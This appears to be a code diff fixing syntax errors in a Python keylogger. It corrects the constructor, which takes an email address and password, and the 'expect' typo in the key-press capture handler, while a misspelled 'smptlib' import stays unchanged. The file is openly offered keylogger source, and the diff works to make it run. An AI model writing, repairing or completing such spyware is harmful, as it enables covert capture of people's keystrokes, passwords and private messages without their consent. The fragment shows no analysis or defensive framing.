@@ -3,7 +3,7 @@ import threading
 import smptlib
 
 class Keylogger:
-    def__init__(self, time_interval, email, password):
+    def __init__(self, time_interval, email, password):
         self.log = "Keylogger Started"
         self.interval = time_interval
         self.email = email
@@ -15,7 +15,7 @@ class Keylogger:
     def process_key_press(self, key):
         try:
             current_key = str(key.char)
-        expect AttributeError:
+        except AttributeError:
             if key == key.space:
                 current_key = " "
             else:
